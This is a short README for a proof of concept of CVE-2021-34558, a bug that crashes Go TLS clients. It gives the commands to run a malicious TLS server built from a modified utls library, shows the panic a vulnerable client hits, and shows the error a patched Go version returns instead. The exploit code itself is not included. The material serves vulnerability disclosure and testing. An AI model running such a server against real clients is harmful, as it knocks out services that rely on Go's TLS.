# POC for CVE-2021-34558

```bash
# Run the malicious TLS server
go run main.go -mode server 

# Run a normal `http.Get` client call against the server which panics
go run main.go -mode client
```

There is a minor modification to `./vendor/github.com/refraction-networking/utls/handshake_server.go` to enable the malicious handshake to be sent with a mismatching certificate/cipher.

It looks like this:

    $ go run main.go -mode client

    panic: interface conversion: interface {} is *ecdsa.PublicKey, not *rsa.PublicKey

    goroutine 7 [running]:
    crypto/tls.rsaKeyAgreement.generateClientKeyExchange(0xc000001c80, 0xc00014a000, 0xc000130580, 0x0, 0x0, 0x4, 0x6e9da0, 0x7fe73e42e201, 0xc00001c758)
            /usr/local/go/src/crypto/tls/key_agreement.go:70 +0x3a6
    crypto/tls.(*clientHandshakeState).doFullHandshake(0xc00015fd48, 0xc00001a380, 0x31)
            /usr/local/go/src/crypto/tls/handshake_client.go:574 +0x5e9
    crypto/tls.(*clientHandshakeState).handshake(0xc00015fd48, 0xc00001c418, 0x4)
            /usr/local/go/src/crypto/tls/handshake_client.go:421 +0x566
    crypto/tls.(*Conn).clientHandshake(0xc00007f180, 0x0, 0x0)
            /usr/local/go/src/crypto/tls/handshake_client.go:220 +0x754
    crypto/tls.(*Conn).Handshake(0xc00007f180, 0x0, 0x0)
            /usr/local/go/src/crypto/tls/conn.go:1391 +0xc9
    net/http.(*persistConn).addTLS.func2(0x0, 0xc00007f180, 0x0, 0xc0000624e0)
            /usr/local/go/src/net/http/transport.go:1530 +0x45
    created by net/http.(*persistConn).addTLS
            /usr/local/go/src/net/http/transport.go:1526 +0x1f6
    exit status 2

A patched version of Go (1.16.6+) does not crash:

    $ go run main.go -mode client
    2021/07/13 06:13:50 <nil> Get "https://127.0.0.1:8443/": tls: server certificate contains incorrect key type for selected ciphersuite